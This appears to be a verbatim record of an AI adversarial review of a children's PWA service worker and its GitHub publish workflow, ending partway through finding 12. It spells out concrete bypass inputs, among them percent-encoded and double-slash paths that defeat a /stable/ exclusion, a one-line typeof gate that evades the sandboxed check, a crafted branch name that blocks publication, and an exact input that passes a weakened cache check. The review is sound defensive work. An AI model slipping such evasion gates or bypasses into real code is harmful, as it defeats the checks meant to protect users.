# PUP-WO-0101 — adversarial pass, verbatim record

**Artifact reviewed:** commit `2118690` on `build/wo-0101`, frozen before dispatch.
**Freeze scope:** every file the work order names as a deliverable — `sw.js`, the
workflow, the CI scripts **and** `docs/feedback/PUP-WO-0101.md` (architecture §5,
as amended from `PUP-WO-0100`'s report). The reviewer confirmed `git status` empty
at start and end; the artifact did not move during the pass.

**Outcome: the reviewer's verdict is NOT SAFE TO MERGE, and the builder accepts
it.** Two conditions named as flag-and-stop in the work order fired — §7 (a path by
which `main`'s content reaches `/stable/`) and §0/§7 (a `PUP-WO-0100` check was
weakened). Dispositions and the stop are in `docs/feedback/PUP-WO-0101.md`.

**Delivered in two parts.** The reviewer's first report covered findings 1–11; a
delegated deep probe on `check-load.mjs` reported afterwards as findings 12–18, and
carried a retraction of one line of the first report. Both parts are reproduced
here in the order they arrived. Its finding numbers are its own and are what the
feedback file's disposition tables refer to.

---

## The prompt, verbatim

````text
You are an adversarial reviewer. Find what is WRONG. You have no stake in this working, you did not write it, and nobody will explain their reasoning to you — you have the artifact and the ground truth, deliberately.

THE ARTIFACT IS FROZEN at commit 2118690844bb26ded1666bdb2520c715a9c6ae73, branch build/wo-0101, repo /home/ikthys777/worktrees/PupPad/builder. It will not move while you work. Confirm with `git rev-parse HEAD` and `git status --short` (expect empty). The working tree is identical to that commit.

UNDER REVIEW:
  sw.js                                  the service worker — THE SUBJECT of this work order
  .github/workflows/ci.yml               checks + a new two-path publication job
  .github/ci/check-cache-isolation.mjs   new check 5
  .github/ci/lib/sw-harness.mjs          sandbox that loads sw.js for check 5
  .github/ci/lib/sw-cdp.mjs              raw-CDP service-worker watcher
  .github/ci/check-load.mjs              check 4, now watching the worker
  .github/ci/check-cache-name.mjs        check 3, changed by this WO
  .github/ci/demo-two-path-caches.mjs    browser evidence for acceptance items 5-7
  docs/feedback/PUP-WO-0101.md           the builder's own summary and claims

GROUND TRUTH (read-only — do NOT modify the repo):
  docs/work-orders/PUP-WO-0101.md   what was asked. READ IT FIRST, especially §0, §1.1, §1.2, §1.3, §2, §3, §5, §7.
  docs/northstar.md                 invariants, cited by number. 3, 4 and 7 matter here.
  docs/architecture.md              §5, §6 — §6 is the authority on the cache hazard.
  docs/findings/PUP-WO-0000.md      §6 is the sw.js contract
  docs/feedback/PUP-WO-0100.md      F16, and the three Playwright dead ends
  index.html                        1942 lines; registers the worker at :1935

CONTEXT AND STAKES. PupPad is an offline PWA for a three-year-old who cannot read. Two copies will be published to ONE origin: newest at /PupPad/, promoted at /PupPad/stable/. Buddy's tablet will point at /stable/; the test device at root.

This is the highest-risk merge in the project. Pages is still build_type legacy, so TODAY Buddy's tablet is on the ROOT copy and a merge to main reaches it within a minute. sw.js is the mechanism northstar invariant 3 depends on — a broken worker does not degrade the app, it can leave a tablet unable to load it at all. caches.keys() is ORIGIN-scoped, so the two copies can see and delete each other's caches.

YOU MAY RUN THINGS:
  cd /home/ikthys777/worktrees/PupPad/builder
  node .github/ci/check-cache-isolation.mjs .
  node .github/ci/check-cache-name.mjs .
  node .github/ci/check-syntax.mjs .
  node .github/ci/check-assets.mjs .
  TMPDIR=$HOME/pw-tmp PUPPAD_CHROMIUM=/usr/bin/chromium-browser node .github/ci/check-load.mjs .
  TMPDIR=$HOME/pw-tmp PUPPAD_CHROMIUM=/usr/bin/chromium-browser node .github/ci/demo-two-path-caches.mjs .
To test against a broken tree, COPY the repo to /tmp and break the copy. NEVER modify the real working tree. If you do by accident, `git checkout -- <path>` and say so.

PROBES. Report what you actually did for each.

**PROBE 1 — GET MAIN'S CONTENT ONTO /stable/. Highest value by a wide margin; anything found here outranks everything else.**
northstar invariant 4: the copy Buddy uses advances only when a human promotes it. Attack the publish job in ci.yml. Consider: racing a push to main and to stable; the stable checkout failing or resolving to a tag rather than a branch; a detached or stale ref; what happens if refs/heads/stable does not exist, is empty, or equals main; whether the build stamps can be forged or inherited; whether the ls-remote verification can be defeated, skipped, or made to compare a value against itself; whether a partial or failed step still deploys; whether the artifact upload can carry the wrong tree; and whether anything about the concurrency or trigger configuration lets a stale run publish over a newer one. The builder claims an earlier version of this verification was tautological and says it fixed it — verify the FIXED version is not also tautological.

**PROBE 2 — ATTACK THE REAP.** sw.js derives CACHE_PREFIX from the worker's scope. Can any worker delete a cache it does not own? Construct adjacent-but-not-owned names, a prefix that is a prefix of another prefix, an empty or "/" scope, a scope with or without a trailing slash, a scope containing characters that encode oddly, a deeply nested path, and any scope where two different paths could derive the SAME prefix. The builder claims a trailing "|" delimiter makes prefixes non-nesting because encodeURIComponent escapes "|" — test that claim directly rather than accepting it.

**PROBE 3 — ATTACK THE LEGACY EXCEPTION.** `pup-pad-v16` is deleted by exact literal. Can it be made to match anything else? Can the exception be reached with a different name, through case, whitespace, unicode normalisation, or a crafted cache name? Is deleting it unconditionally on EVERY activation of BOTH workers correct, or does it have a side effect?

**PROBE 4 — ATTACK §1.2, the /stable/ exclusion.** The root worker must not serve or cache anything under /stable/. Find a request shape that gets through: a redirect, a query string, a fragment, a path that differs in case, percent-encoding, a double slash, "/stable" with no trailing slash, "/stableX", a cross-origin URL, a request from within /stable/ itself, or a navigation preload. Also: does the exclusion misfire on the STABLE worker, or on any path it should be serving?

**PROBE 5 — ATTACK THE NEW CHECK AND THE HARNESS.** check 5 asserts behaviour in a sandbox (lib/sw-harness.mjs), not in a browser. Where does the sandbox differ from a real ServiceWorkerGlobalScope in a way that lets a real defect pass? Can sw.js be written so it passes check 5 and still reaps foreign caches in a real browser? Also check the raw-CDP watcher (lib/sw-cdp.mjs): can a service worker error be missed — thrown before the watcher attaches, in a worker that never activates, after the observation window, or in a second worker?

**PROBE 6 — did anything WEAKEN a PUP-WO-0100 check?** §0 says those four checks are the only thing standing under this merge and weakening one is a flag-and-stop. check 3 was changed. Read the change. Is the new version strictly as strong as the old one for the defects the old one caught? Find a defect the OLD check-cache-name.mjs would have caught that the NEW one does not.

ALSO REPORT: anything in ci.yml that would fail on a real GitHub runner; any claim in a comment or in docs/feedback/PUP-WO-0101.md that the code does not actually do; scope violations against §4; and anywhere the builder asserts something as demonstrated that it appears to have assumed.

OUTPUT: findings first, most serious first. For each — what is wrong, where (file:line), why it matters, confidence, and whether you DEMONSTRATED it or reasoned it. Then a record per probe of what you actually did. Then one line: is this safe to merge to a branch that publishes to a three-year-old's tablet?

Be blunt. Do not soften, do not pad with praise. If something is genuinely sound, say so in one line and move on.
````

---

## Part 1 — findings 1–11, probe records, retraction log, unedited

`````text
Reproducing findings 1–11 and the probe records verbatim. No commands run; no repository changes.

---

# FINDINGS 1–11 (re-sent unedited)

Frozen artifact: `2118690844bb26ded1666bdb2520c715a9c6ae73`, branch `build/wo-0101`, `git status --short` empty at start and end.

### 1. `main`'s content can reach `/stable/`. §7 flag-and-stop. DEMONSTRATED.
`.github/workflows/ci.yml:152-154`

```
mkdir -p site/stable
tar -C stable-src --exclude=.git -cf - . | tar -C site/stable -xf -
```

`site` is a checkout of `refs/heads/main`. If `main` contains a path `stable/`, `site/stable` already exists with **main's files**, and the tar *merges over* it — it does not replace it. There is no `rm -rf site/stable`. Every file main has under `stable/` that the `stable` branch does not have survives and is published at `/stable/`.

Reproduced verbatim from the workflow in a scratch repo: `main` with `stable/leaked-from-main.html`, `stable` without it.

```
promoted (/stable/): stamp=stable@89285ee2d452 head=89285ee2d452 remote=89285ee2d452
OK: each copy carries the commit its own remote ref points at.

site/stable/leaked-from-main.html  ->  "MAIN'S OWN FILE LEAKED TO /stable/"
```

The invariant-4 step passes. `main` today has no `stable/` path (`git ls-tree -r --name-only HEAD | grep -i '^stable'` → empty), so this is latent, not live — but nothing in CI, `sw.js`, or the scope fence forbids adding one, and §7's bar is "found, suspected, **or merely not ruled out**." Confidence: certain.

### 2. The invariant-4 verification verifies refs, not content — and two of its three comparisons are still tautological, including the one the builder claims to have fixed. DEMONSTRATED.
`ci.yml:156-198`, specifically `:185`, `:186`

The comment at `:159-169` and F3 at `docs/feedback/PUP-WO-0101.md:150-154` both state the step was tautological "in two ways" and that `git ls-remote` fixed it. `ls-remote` was **added as a third assertion; neither tautology was removed.**

- `:185` `[ "$stamp_ref" = "$want_ref" ]` — `stamp_ref` is read back from the JSON that `stamp()` (`:145`) wrote from the *same literal*, passed at `:150-151` (`stamp site main /`) and again at `:193-194` (`verify site main …`). `"main" = "main"`. This is verbatim the defect F3 describes as "compared the stamp's `ref` field against the literal this workflow had just written into it."
- `:186` `[ "$stamp_sha" = "$head_sha" ]` — `stamp_sha` is `git -C site rev-parse HEAD` (`:144`); `head_sha` is `git -C site rev-parse HEAD` (`:179`, `$4`). Same command, same repo, same run. This is verbatim "HEAD against HEAD, true by construction."
- `:187` is the only live assertion, and it compares a checkout of `refs/heads/X` against `ls-remote` of `refs/heads/X` — the same source read twice. It is a race detector, not a content check.

Demonstrated: `stable-src` at the correct `refs/heads/stable` HEAD, with main's `index.html` copied into its working tree.

```
promoted (/stable/): stamp=stable@89285ee2d452 head=89285ee2d452 remote=89285ee2d452
OK: each copy carries the commit its own remote ref points at.
>>> CONTENT ACTUALLY PUBLISHED AT /stable/index.html :
MAIN CONTENT — NEWEST, UNPROMOTED
```

The step whose own comment says it "STANDS BETWEEN AN UNPROMOTED COMMIT AND A THREE-YEAR-OLD'S TABLET" never hashes, diffs, or otherwise looks at the bytes it publishes. What actually protects `/stable/` is `ref: refs/heads/stable` at `:132` — one line, and a good one. The 40 lines below it add a race detector and two constants. Confidence: certain.

### 3. The publish job deploys content no check has ever read — and `refs/heads/stable` today carries the origin-wide reaper.
`ci.yml:99-100`, `:119-133`; verified: `grep -rn "refs/heads/stable\|site/stable" .github/ci/` → **no CI script ever reads the stable copy.**

The `checks` job checks out the *triggering* ref (`:40-46`, no `ref:`). The `publish` job checks out **both** refs **live**. So:

- A push to `stable` runs checks on stable's tree, then publishes whatever `main` is at that moment. If main is red, its content publishes anyway.
- A push to `main` runs checks on main's tree, then publishes whatever `stable` is at that moment — **to Buddy's tablet** — with stable's content never checked in that run.

§1.3's "A red check must mean nothing publishes" is false in both directions.

Concretely, today: `refs/heads/stable` @ `2952aa1` has no `.github/` and its `sw.js` is

```js
names.filter(function(name) { return name !== CACHE_NAME; })
```

— the exact origin-wide reap architecture §6 names as the hazard. If Pages is flipped (§6 step 3) before the fast-forward (step 2), the first Actions deployment publishes that worker to `/stable/`, and it will delete the root worker's `puppad|%2FPupPad%2F|v17` on every activation. The ordering is enforced by prose in a work order, not by the workflow. Check 5 asserts about **one** `sw.js` evaluated at two scopes; §1.4 asked about "the two **published** copies." Confidence: high, reasoned from the yaml plus verified branch content.

### 4. The `/stable/` exclusion (§1.2) is bypassed by three request shapes. DEMONSTRATED in a real browser.
`sw.js:88-99`, specifically `:98` `return u.pathname.indexOf(FOREIGN_SUBTREE) === 0;`

`URL.pathname` is neither percent-decoded nor slash-normalised; every static server (GitHub Pages included, and the builder's own demo server at `demo-two-path-caches.mjs:34`) decodes and normalises before resolving. Root worker controlling, real Chromium, real cache inspection:

```
CONTROL — /stable/manifest.json      -> stableContent=true  inRootCache=false   (correctly declined)
ATTACK  — /%73table/manifest.json    -> stableContent=true  inRootCache=true    *** LEAK ***
ATTACK  — /stable%2Fmanifest.json    -> stableContent=true  inRootCache=true    *** LEAK ***
ATTACK  — //stable/manifest.json     -> stableContent=true  inRootCache=true    *** LEAK ***
```

A *navigation* to `//stable/` — a one-character typo, or any base-path concatenation bug — is worse:

```
page url            : http://…//stable/
controlled by worker: the ROOT worker, on a /stable/ page
registrations       : http://…/  ,  http://…//stable/
caches              : puppad|%2F|v17 , puppad|%2F%2Fstable%2F|v17
/stable/ page HTML cached under the ROOT prefix: true
```

That is northstar invariant 7 failing three ways at once: the promoted copy's HTML cached under the root prefix, the root worker controlling a `/stable/` page, and a **third** registration with a **third** cache that neither the root nor the stable worker will ever reap, because its prefix nests under neither. It leaks permanently.

`/PupPad/stable` with no trailing slash is handled correctly — the 301 lands on `/stable/`, which is declined. Confidence: certain for the mechanism; the server half is standard behaviour and matches the builder's own demo server.

### 5. check 3 was weakened. §0 flag-and-stop. DEMONSTRATED end-to-end.
`.github/ci/check-cache-name.mjs:103-114`

`cacheName()` now matches `CACHE_VERSION\s*=\s*(['"])([^'"]*)\1\s*;` **anywhere in the file** and **never asserts that `CACHE_NAME` references `CACHE_VERSION`.** The old check read the literal `caches.open()` was actually handed. Those are different propositions.

Isolated clone, base = frozen HEAD, head = `index.html` changed + `CACHE_VERSION` bumped to `'v18'` + `sw.js:54` pinned to `CACHE_PREFIX + 'v17'`:

```
=== runtime identity, base vs head ===
  2118690 -> CACHE_NAME = puppad|%2FPupPad%2F|v17
  HEAD    -> CACHE_NAME = puppad|%2FPupPad%2F|v17
=== NEW check 3 ===
  CACHE_NAME: v17 -> v18
CHECK 3 PASSED — cached asset(s) changed: index.html, and CACHE_NAME changed from "v17" to "v18".
exit=0
```

A cached asset changed, the runtime cache identity is **byte-identical**, every installed client keeps serving the stale `index.html`, and the check prints a sentence that is false. A second variant needs no code change at all: because `String.match` takes the first hit and this WO put ~52 lines of prose above the assignment, `CACHE_VERSION = 'v18';` inside the comment at `sw.js:53` satisfies the check while the real assignment stays `'v17'` — confirmed by regex against the frozen file. The delegated probe additionally produced a clean old-red/new-green pair on a shape both regexes parse.

`docs/feedback/PUP-WO-0101.md:27` ("No PUP-WO-0100 check was weakened") and `:135`/`check-cache-name.mjs:99-101` ("The assertion itself is unchanged") are both false. F2's own moral — "the test I nearly skipped is the one that found it" — was not carried one step further: the three tests run all probe the asset half; none probes whether the token read is the token used.

Note also: check 3 is **inert on this PR** — `sw.js` is not in `urlsToCache`, so the one check guarding cache identity does not exercise on the change that rewrites cache identity.

### 6. Check 5 is a sandbox and a one-line gate defeats it; the browser proof is not in CI. DEMONSTRATED.
`.github/ci/lib/sw-harness.mjs:49-53`

The sandbox exposes only `self, caches, URL, console, fetch, Promise, Response, Request`. Adding one line to the activate filter:

```js
if (typeof ExtendableEvent !== 'undefined') return name !== CACHE_NAME; /* origin-wide */
```

→ `CHECK 5 PASSED` (exit 0), all thirteen assertions green. The same file under the builder's browser demo: `an unrelated cache on the same origin was DELETED — the reap is origin-wide`. `demo-two-path-caches.mjs` is **not wired into ci.yml** (verified), so nothing standing in CI catches this.

Worth noting for the acceptance record: against that hostile worker the demo's *own* item-5 assertion — "THE /stable/ CACHE SURVIVED", roadmap P1 gate item 4 — still printed **ok**. It was caught only by the two incidental assertions. Acceptance item 5's evidence is weaker than claimed.

Two further harness gaps: the fake request is `{ url }` only, so `sw.js` can branch on any real `Request` property; and `dispatch` `await`s the handler, so an asynchronous `respondWith` reports `respondWithCalled = true` in the harness and throws `InvalidStateError` in a browser (confirmed).

### 7. The legacy exception is not scoped to the worker that owns the cache. DEMONSTRATED.
`sw.js:74`, `:122-123`

`pup-pad-v16` was only ever created by the **root** copy. The `/stable/` worker deletes it too — it is the one deletion outside the worker's own prefix, and the file's whole thesis is that no worker deletes what it does not own. Real browser, device seeded with `pup-pad-v16`, only the `/stable/` worker brought up (Buddy's tablet after §6 step 5, root PWA not opened online since the merge):

```
device state before: pup-pad-v16
device state after ONLY the /stable/ worker ran: puppad|%2Fstable%2F|v17
  *** STABLE'S WORKER DELETED pup-pad-v16 — a cache created and owned by the ROOT copy.
  root copy now holds NO cache: true
```

The root copy is left with no offline cache and no replacement until it is next loaded online — northstar invariant 3 on the root install. The builder observed this exact behaviour (`feedback:121-122`, "removed — by stable's worker, which is correct") and read it as correct rather than as a cross-path deletion. Fix is one clause: `if (!IS_STABLE_WORKER && name === LEGACY_CACHE_EXACT)`.

### 8. Stale and now-false comments on the safety-critical file.
- `ci.yml:1` "four checks" — there are five. `ci.yml:36` `name: Four checks` — the GitHub UI will label a five-step job "Four checks".
- `ci.yml:3-4` **"This workflow REPORTS. It does not publish, deploy, or write to any branch (northstar invariant 4). Publication is PUP-WO-0101's."** Directly contradicted by the job 90 lines below.
- `ci.yml:6-10` "a diff confined to `.github/` and `docs/` reaches the repository without reaching Buddy's tablet" — false for this diff, which is the whole point of §0.
- `check-cache-name.mjs:4`, `:165`, `:169` still cite `sw.js:1` and `sw.js:19-29`; actual locations are `sw.js:53` and `sw.js:118-132`. `:141` prints `CACHE_NAME:` for a value that is `CACHE_VERSION` — that label is what makes finding 5 read as a confident pass.

### 9. A crafted branch name permanently blocks publication. DEMONSTRATED. Fail-closed.
`ci.yml:180` `git ls-remote "$remote" "refs/heads/${want_ref}" | cut -f1`

`ls-remote` patterns match on path-component tails. A branch `decoy/refs/heads/main` makes it return two lines; `remote_sha` becomes multi-line and `:187` fails. Demonstrated. Denial of service, not a bypass. Fix: `--exit-code refs/heads/X` plus `head -1`, or `awk 'NR==1'` after an exact-match filter.

### 10. `sw.js:51` has no guard, making the guard at `:35-39` unreachable — and wrong if it weren't.
`var SCOPE_PATH = new URL(workerScope()).pathname;` throws on an unparseable scope and kills the whole worker before `cachePrefixFor`'s `try/catch` can fall back. If that fallback *were* reachable, `path = '/'` gives **both** deploy paths the prefix `puppad|%2F|` — a shared prefix, i.e. mutual deletion. Dead code that would be a hazard if it were live. Low reachability (`registration.scope` is always absolute).

### 11. Merging this puts a red job on `main` immediately, and the feedback does not say so.
Pages is verified `build_type: legacy`, `source: main:/`. `actions/deploy-pages` fails against a legacy site, so the `publish` job goes red on the merge commit and stays red until §6 step 3. Harmless to the site; the all-PASS gate table at `feedback:12-23` never mentions it.

---

## WHAT IS SOUND (as originally written — see the retraction below for the one line I withdrew)

- The trailing-`|` non-nesting claim is **true**: `encodeURIComponent('|') === '%7C'`, so `E1|` is a prefix of `E2|` only when `E1 === E2`. Tested across 12 scopes including `file://`, `//`, `|`, `%7C`, `%2F`, spaces — zero nesting, zero reachable collisions (`/PupPad` vs `/PupPad/` collide but `registration.scope` always has the trailing slash).
- The legacy exception is a genuine `===` on a string literal — case, near-miss, and unicode variants cannot reach it.
- ~~**F16 is genuinely closed.** … This is the best work in the WO.~~ **RETRACTED — see below.**
- Scope fence (§4) is clean: diff vs `5d850f2` touches only `.github/`, `docs/feedback/PUP-WO-0101.md`, `sw.js`; `index.html`, `manifest.json`, both icons diff to empty.
- Publish steps fail closed: no `continue-on-error`, no `if: always()`, no `|| true`; default shell is `bash -e -o pipefail`; `local` declarations are separated from assignments so the classic `local x=$(false)` masking bug is avoided.
- All pinned action majors exist (`checkout@v7`, `setup-node@v7`, `upload-pages-artifact@v4`, `deploy-pages@v4`); `upload-pages-artifact` excludes `.git`/`.github`/dotfiles, so the checkout metadata is not published; the repo is public so unauthenticated `ls-remote` works.
- Publication is not stale-able: both refs are read live in every run, so a late run republishes current content. F4's claim about `stable@2952aa1` having no workflow is accurate.

---

# PROBE RECORDS (as originally written)

**PROBE 1** — Read the publish job line by line. Built a scratch git remote with `main` and `stable` at different commits and executed `ci.yml:139-198` **verbatim** twice: (a) with a `stable/` directory in `main` → leak published, step said OK; (b) with main's content in `stable-src`'s working tree at the correct HEAD → `/stable/index.html` = "MAIN CONTENT — NEWEST, UNPROMOTED", step said OK. Traced `stamp()`/`verify()` argument flow to prove `:185`/`:186` are constants. Tested the `ls-remote` pattern with a `decoy/refs/heads/main` branch. Checked trigger/concurrency/permissions/environment config, `set -euo pipefail` behaviour, action tag existence via the GitHub API, `upload-pages-artifact@v4`'s tar excludes, repo visibility, and live Pages `build_type`.

**PROBE 2** — Evaluated `cachePrefixFor` over 12 scopes (root, stable, no-slash, `//`, literal `|`, `%7C`, `%2F`, spaces, `+`, `file://`, deep nesting) and ran a full N×N nesting matrix. Verified `encodeURIComponent('|')`. Confirmed the delimiter claim holds and no reachable two-path collision exists. Found the unreachable-and-wrong `'/'` fallback at `sw.js:35-39` vs the unguarded `:51`. **The builder's central claim is correct.**

**PROBE 3** — Confirmed `===` cannot match a near-miss. Then attacked the *scoping* rather than the matching: wrote a browser probe seeding `pup-pad-v16` and bringing up **only** the `/stable/` worker. Demonstrated cross-path deletion leaving the root copy with no cache.

**PROBE 4** — Enumerated `URL.pathname` normalisation for 10 request shapes in Node, then confirmed the three surviving ones in real Chromium against a server that decodes exactly as the builder's own demo server does, inspecting the root cache directly. Added a navigation probe: `//stable/` yields a third registration and a third orphan cache. Verified `/stable` (no slash) is correctly handled via 301.

**PROBE 5** — Read `sw-harness.mjs` and `check-cache-isolation.mjs`. Planted a one-line `typeof ExtendableEvent` gate: check 5 green, browser demo red. Confirmed the demo is absent from `ci.yml`. Demonstrated the async-`respondWith` harness gap and the `{url}`-only fake request. On the CDP side: read `sw-cdp.mjs` and `check-load.mjs`, independently confirmed the required red, and confirmed both fail-closed paths. Residual gaps (pre-existing to this WO, not regressions): the observation window is `SETTLE_MS` + a fixed `waitForTimeout(500)` at `:243` — later errors are missed; `check-load.mjs:281` accepts `installing` and `waiting` as pass; `controlled` is computed at `:232` and printed but never asserted; only `Runtime.enable` is sent, no `Log.enable`; `CDP_PORT` defaults to a fixed `9333`. A delegated deep probe on this file did not report before I finished; everything above is my own. *(That probe has since reported — findings 12–18.)*

**PROBE 6** — Delegated, then independently reproduced. Read old and new `cacheName()`. Confirmed by regex against the frozen file that `CACHE_VERSION` is read from anywhere and `CACHE_NAME`'s reference to it is never asserted. Built the end-to-end defect in a clean `git clone --no-hardlinks`, evaluated both revisions' `sw.js` in a VM with a stubbed scope to prove the runtime identity is unchanged, and ran the shipped check: green.

---

# RETRACTION LOG

One retraction, made when the delegated CDP probe reported:

> **Retracted:** "**F16 is genuinely closed.** I independently reproduced the required red… **This is the best work in the WO.**"
> **Replaced with:** the mechanism is real and §1.5's acceptance criterion is met — the red does fire on the named defect — but the builder's stated guarantee ("fails if no worker session was ever attached" / "green because nothing was looking is the exact failure this closes") is overstated in two demonstrated ways (findings 12 and 13), and the claim that the page is "verified to end up controlled" is false (finding 14). Check 4 moved out of my "sound" list into the findings list.

No other finding was withdrawn or downgraded.

---

# THE TWO ITEMS YOU ASKED FOR PRECISELY

## A. The two paths that put `main`'s content onto `/stable/`

Your `ls-remote` assertion is not bypassed. It is **correct and it fires** — on both paths, it passed. The gap is what it is pointed at.

**What `verify` actually inspects for the promoted copy** (`ci.yml:174-194`):

| variable | line | source |
|---|---|---|
| `stamp_ref` | `:177` | `site/stable/build-stamp.json` — a file **this workflow generated** at `:145` |
| `stamp_sha` | `:178` | same file |
| `head_sha` | `:179` | `git -C "$4" rev-parse HEAD`, and `$4` is **`stable-src`** (`:194`), not `site/stable` |
| `remote_sha` | `:180` | `git ls-remote` for `refs/heads/stable` |

So the chain is `refs/heads/stable` → `stable-src/.git/HEAD` → `ls-remote`. **The bytes at `site/stable/` are never read except for the stamp file the workflow itself wrote.** The only other line touching them is `:196`, `test -f site/stable/index.html`, which is an existence test.

`ls-remote` therefore certifies *"the sibling directory `stable-src` is checked out at the commit the server says `refs/heads/stable` points at."* It does not certify *"the directory being published is that commit's tree."* Those diverge the moment anything writes into `site/stable` after the checkout — and `:152-154` does exactly that.

**Path 1 — the tar merge (`ci.yml:152-154`). The reachable one.**
Mechanism: `mkdir -p site/stable` is a no-op when `site/stable` already exists, and it already exists whenever `main` carries a `stable/` directory, because `site` is main's checkout. `tar … | tar -C site/stable -xf -` extracts *over* that directory; it does not clear it. Files present in main's `stable/` and absent from `stable`'s tree survive into the artifact.
Line that permits it: `:152` — the missing `rm -rf site/stable` — and `:154`, the merging extract.
Demonstration: scratch remote, `main` = `index.html` + `stable/leaked-from-main.html` + `stable/index.html`; `stable` = `index.html` + `only-in-stable.txt`. Ran `ci.yml:139-198` verbatim. Result:

```
promoted (/stable/): stamp=stable@89285ee2d452 head=89285ee2d452 remote=89285ee2d452
OK: each copy carries the commit its own remote ref points at.

find site/stable -type f
  site/stable/build-stamp.json
  site/stable/index.html            <- "STABLE CONTENT"      (stable won this one)
  site/stable/leaked-from-main.html <- "MAIN'S OWN FILE LEAKED TO /stable/"
  site/stable/only-in-stable.txt
```

`ls-remote` passed. A file from `main` shipped to `/stable/`. Requires no change to the workflow — only a `stable/` path in `main`, which nothing forbids.

**Path 2 — content divergence from the checkout HEAD. The class demonstration.**
Mechanism: any write into `stable-src`'s or `site/stable`'s working tree between the checkout and the upload is invisible to `verify`, because `verify` reads `.git/HEAD`, not the files. Today the workflow's only such write is the stamp; a future step, a composite action, or a `post` hook would not be caught.
Line that permits it: `:179` — `head_sha` comes from `git -C stable-src rev-parse HEAD` rather than from a hash of the tree actually being published.
Demonstration: `stable-src` cloned at `refs/heads/stable` (HEAD untouched), then `cp site/index.html stable-src/index.html`. Ran the same verbatim steps:

```
promoted (/stable/): stamp=stable@89285ee2d452 head=89285ee2d452 remote=89285ee2d452
OK: each copy carries the commit its own remote ref points at.
>>> CONTENT ACTUALLY PUBLISHED AT /stable/index.html :
MAIN CONTENT — NEWEST, UNPROMOTED
```

**The fix both paths share:** assert the tree, not the ref. Either `rm -rf site/stable` before the copy *and* `git -C stable-src status --porcelain` empty, or — stronger and cheaper — compare `git -C stable-src rev-parse HEAD^{tree}` against a `git hash-object` walk of what is about to be uploaded, excluding only the stamp.

Separately, and independently of both paths: `:185` and `:186` contribute nothing. `stamp()` at `:150-151` writes the literals `main` and `stable`; `verify()` at `:193-194` checks them against the same literals. `stamp_sha` and `head_sha` are the identical `git -C <dir> rev-parse HEAD` invocation run twice on an unchanged repo. Deleting both lines would not weaken the step.

## B. check 3 — the exact input where the new check passes

**Base:** `2118690844bb26ded1666bdb2520c715a9c6ae73` (the frozen commit, unmodified).
**Head:** base plus exactly three edits, in a clean `git clone --no-hardlinks` of `/home/ikthys777/PupPad`:

1. `index.html` — appended one line (`<!-- E3: a cached asset really changed -->`). `index.html` is in `urlsToCache`, so this is a genuine cached-asset change.
2. `sw.js:53` — `var CACHE_VERSION = 'v17';` → `var CACHE_VERSION = 'v18';`
3. `sw.js:54` — `var CACHE_NAME = CACHE_PREFIX + CACHE_VERSION;` → `var CACHE_NAME = CACHE_PREFIX + 'v17';`

**The runtime cache identity, evaluated by loading each revision's `sw.js` in a VM with a stubbed `registration.scope`:**

```
2118690 -> CACHE_NAME = puppad|%2FPupPad%2F|v17
HEAD    -> CACHE_NAME = puppad|%2FPupPad%2F|v17
```

Byte-identical. Every installed client keeps serving the old `index.html` forever.

**New check (`PUSH_BEFORE_SHA=<base> node .github/ci/check-cache-name.mjs .`):**

```
  files changed in range: 2 -> index.html, sw.js
  CACHE_NAME: v17 -> v18

CHECK 3 PASSED — cached asset(s) changed: index.html, and CACHE_NAME changed from "v17" to "v18".
exit=0
```

The printed sentence is false: `CACHE_NAME` did not change.

**What the old check does on this same input — stated precisely, because the distinction matters.** The old `cacheName()` read `CACHE_NAME\s*=\s*['"]…['"]`. At *both* revisions here `CACHE_NAME` is a computed expression, so the old check parses nothing and exits red with *"could not parse the cache identity literal."* So on this exact input: **new = green, old = red** — but the old check's red is a parse failure, not a semantic catch. That is the honest characterisation and I will not overstate it.

The clean apples-to-apples pair — a file shape both regexes parse, where the old goes red for the right reason and the new goes green — was produced by the delegated probe, not by me; the commits it built were destroyed when I reset the contaminated worktree, so I am reporting it as its result rather than mine.

**The regression that is entirely mine and does not depend on the old check at all:** `check-cache-name.mjs:107-113` reads a token named `CACHE_VERSION` from anywhere in the file and never asserts that `CACHE_NAME` is derived from it. That severs the check from the thing it is checking. Two inputs exploit it — the decoupling above, and, needing no code change whatsoever, the string `CACHE_VERSION = 'v18';` placed inside the ~52-line comment block this WO added above `sw.js:53`, since `String.match` returns the first hit (confirmed by running the shipped regex against the frozen file: it reports `v18` while the real assignment still reads `v17`).

**The one-line fix:** after extracting the version, assert `/CACHE_NAME\s*=\s*CACHE_PREFIX\s*\+\s*CACHE_VERSION\s*;/` is present, and anchor the version match to a `^var ` line.

---

Verdict unchanged: **not safe to merge.** Findings 1, 2, 3, 4 and 5 are each independently disqualifying, and 1 and 5 are named flag-and-stop conditions in the work order (§7 and §0 respectively).
`````

---

## Part 2 — findings 12–18, the delegated CDP probe, unedited

Reported after Part 1 and carrying the retraction logged above.

`````text
Tree re-verified: HEAD `2118690`, `git status --porcelain` empty, branch tip correct, reflog shows only my restore, `/home/ikthys777/PupPad` untouched. The second agent's git calls were read-only.

**Second machine-state disclosure:** that agent deleted `~/.cache/ms-playwright/chromium-1194` (it was a broken half-extraction) and started a re-download. `~/.cache/ms-playwright/` is currently **empty of browsers** and `npx playwright install chromium` is still running (pid 813920). Until it finishes, a local `playwright` run without `PUPPAD_CHROMIUM` will fail. Nothing in my findings depends on it — I used `PUPPAD_CHROMIUM=/usr/bin/chromium-browser` throughout. CI is unaffected (it installs fresh).

---

# ADDENDUM — PROBE 5b, and a correction to my own verdict

## I was wrong about check 4. Retracting one line.

I wrote: *"**F16 is genuinely closed.** … This is the best work in the WO."* The first half stands; the second half was too generous, and the disagreement is the finding.

We agree on the mechanism: a throwing `fetch` handler goes red, reproduced independently twice, no false positive on a clean tree. Where I stopped, the delegate kept going and broke the **liveness guarantee** the builder builds the whole claim on.

`docs/feedback/PUP-WO-0101.md:98-99`:
> "Check 4 now **fails if no worker session was ever attached**. Green because nothing was looking is the exact failure this closes."

It is not closed. It is closed only for *literally zero sessions on TCP port 9333*.

### 12. FALSE GREEN — the watcher never verifies it attached to the browser Playwright launched. DEMONSTRATED.
`.github/ci/check-load.mjs:99` `const CDP_PORT = Number(process.env.CDP_PORT || 9333);` · `lib/sw-cdp.mjs:23` `fetch(http://127.0.0.1:${port}/json/version)`

Chromium is launched with `--remote-debugging-port=9333`, but Playwright drives it over a **pipe**. Nothing correlates the CDP browser with the Playwright browser. Two overlapping `check-load.mjs` runs on the default port:

```
A (healthy tree, long SETTLE_MS, binds 9333 first)   sessions watched: 1   CHECK 4 PASSED  exit 0
